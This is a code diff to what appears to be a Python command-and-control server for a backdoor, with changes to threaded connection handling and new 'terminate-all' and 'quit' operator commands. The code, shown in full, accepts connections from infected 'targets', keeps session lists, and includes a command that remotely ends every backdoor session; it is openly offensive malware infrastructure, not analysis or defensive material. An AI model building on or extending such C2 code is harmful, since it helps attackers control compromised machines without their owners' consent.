@@ -145,6 +145,7 @@ def acceptConnections():
     while True:
 
         if stopFlag:
+            t1.join()
             break
         
         #sock.timeout(1)
@@ -153,6 +154,7 @@ def acceptConnections():
             target, ip = sock.accept()
             targets.append(target)
             ips.append(ip)
+            print('\n')
             print(termcolor.colored(f'[+] {str(ip)} joined the network!', 'green'))
         
         except:
@@ -170,6 +172,7 @@ print(termcolor.colored(f'[+] Server listening on port [{PORT}] for incoming con
 sock.listen()
 
 t1 = threading.Thread(target=acceptConnections)
+t1.daemon=True
 t1.start()
 
 print(termcolor.colored('[+] Waiting for incoming connections...'))
@@ -202,7 +205,7 @@ while True:
         except:
             print(termcolor.colored(f'[-] No such session id ({str(num)})', 'red'))
 
-    elif command == 'shutdown': # Exits the command & controll center and shuts down every backdoor intance
+    elif command == 'shutdown': # Exits the command & controll center and shuts down every backdoor instance
         
         print(termcolor.colored('[WARN] The shutdown command will end every backdoor session remotly', 'yellow'))
     
@@ -234,6 +237,12 @@ while True:
         targets.remove(Target)
         ips.remove(ip)
     
+    elif command.startswith('terminate-all'): # Turn-off every target pc connected to the network
+        print(f'[+] Turning off {str(len(targets))} machines')
+
+    elif command.startswith('quit'): # Exits the command and control center without ending the target's sessions
+        break
+
     elif command == '':
         pass
 
@@ -255,4 +264,4 @@ while True:
     else:
         print(termcolor.colored(f"[!!!] Unable to find command '{str(command)}'", 'red'))
 
-t1.join()
+#t1.join()
